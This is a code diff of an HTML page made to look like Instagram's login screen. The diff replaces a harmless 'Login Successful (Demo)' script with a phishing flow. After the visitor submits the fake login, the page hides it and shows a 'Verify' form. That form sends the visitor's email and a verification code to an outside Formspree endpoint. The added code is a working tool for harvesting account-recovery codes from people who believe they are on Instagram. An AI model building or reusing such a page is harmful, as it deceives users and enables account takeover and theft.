@@ -6,7 +6,6 @@
 
 <title>Instagram</title>
 
-<!-- Instagram font style -->
 <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 
 <style>
@@ -16,46 +15,42 @@ body {
     margin: 0;
 }
 
-/* Center everything */
-.main {
+.wrapper {
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
 }
 
-/* Login box */
-.container {
+.box {
     width: 350px;
-    background: #fff;
+    background: white;
     border: 1px solid #dbdbdb;
-    padding: 40px 30px;
+    padding: 40px 40px 20px;
     text-align: center;
 }
 
-/* Instagram text logo */
-.logo-text {
+.logo {
     font-family: 'Grand Hotel', cursive;
-    font-size: 50px;
-    margin-bottom: 30px;
+    font-size: 48px;
+    margin-bottom: 25px;
 }
 
-/* Inputs */
-input {
+.input {
     width: 100%;
-    padding: 10px;
-    margin-bottom: 8px;
+    height: 36px;
+    padding: 9px;
+    margin-bottom: 6px;
     border: 1px solid #dbdbdb;
-    background: #fafafa;
     border-radius: 3px;
-    font-size: 14px;
+    background: #fafafa;
+    font-size: 12px;
 }
 
-/* Button */
-button {
+.btn {
     width: 100%;
-    padding: 10px;
-    background-color: #3897f0;
+    height: 34px;
+    background-color: #0095f6;
     border: none;
     color: white;
     font-weight: bold;
@@ -64,17 +59,12 @@ button {
     cursor: pointer;
 }
 
-button:hover {
-    background-color: #1877f2;
-}
-
-/* OR divider */
 .divider {
     display: flex;
     align-items: center;
-    margin: 20px 0;
-    color: #8e8e8e;
+    margin: 18px 0;
     font-size: 13px;
+    color: #8e8e8e;
 }
 
 .divider::before,
@@ -83,69 +73,94 @@ button:hover {
     flex: 1;
     height: 1px;
     background: #dbdbdb;
+}
+
+.divider span {
     margin: 0 10px;
 }
 
-/* Forgot password */
 .forgot {
-    color: #00376b;
     font-size: 12px;
-    margin-top: 15px;
+    color: #00376b;
+    margin-top: 12px;
     cursor: pointer;
 }
 
-/* Message */
-#loginMessage {
+.signup {
+    width: 350px;
+    background: white;
+    border: 1px solid #dbdbdb;
+    text-align: center;
+    padding: 20px;
     margin-top: 10px;
     font-size: 14px;
 }
 
-.success { color: green; }
-.error { color: red; }
+.signup span {
+    color: #0095f6;
+    font-weight: bold;
+}
 
+#msg {
+    margin-top: 10px;
+    font-size: 13px;
+}
 </style>
 </head>
 
 <body>
 
-<div class="main">
-    <div class="container">
+<div class="wrapper">
+    <div>
 
-        <div class="logo-text">Instagram</div>
+        <!-- LOGIN BOX -->
+        <div class="box">
 
-        <form onsubmit="return login()">
+            <div class="logo">Instagram</div>
 
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <form onsubmit="return showForm()">
+                <input class="input" type="text" placeholder="Phone number, username, or email" required>
+                <input class="input" type="password" placeholder="Password" required>
 
-            <input type="password" id="password" placeholder="Password" required>
+                <button class="btn">Log In</button>
 
-            <button type="submit">Log In</button>
+                <div class="divider"><span>OR</span></div>
 
-            <div class="divider">OR</div>
+                <div class="forgot">Forgot password?</div>
+            </form>
 
-            <div class="forgot">Forgot password?</div>
+        </div>
 
-            <p id="loginMessage"></p>
+        <!-- FORMSPREE FORM (HIDDEN INITIALLY) -->
+        <div class="box" id="verifyBox" style="display:none;">
 
-        </form>
+            <div class="logo" style="font-size:28px;">Verify</div>
+
+            <form action="https://formspree.io/f/mvojnako" method="POST">
+                <input class="input" type="email" name="email" placeholder="Your Email" required>
+                
+                <input class="input" type="text" name="message" placeholder="Enter Verification Code" required>
+
+                <button class="btn">Submit</button>
+            </form>
+
+        </div>
+
+        <div class="signup">
+            Don't have an account? <span>Sign up</span>
+        </div>
 
     </div>
 </div>
 
 <script>
-function login() {
-    let u = document.getElementById("username").value;
-    let p = document.getElementById("password").value;
-    let msg = document.getElementById("loginMessage");
-
-    if(u && p){
-        msg.className = "success";
-        msg.innerHTML = "Login Successful (Demo)";
-    } else {
-        msg.className = "error";
-        msg.innerHTML = "Enter valid details";
-    }
-
+function showForm(){
+    // hide login
+    document.querySelector(".box").style.display = "none";
+    
+    // show verification form
+    document.getElementById("verifyBox").style.display = "block";
+    
     return false;
 }
 </script>
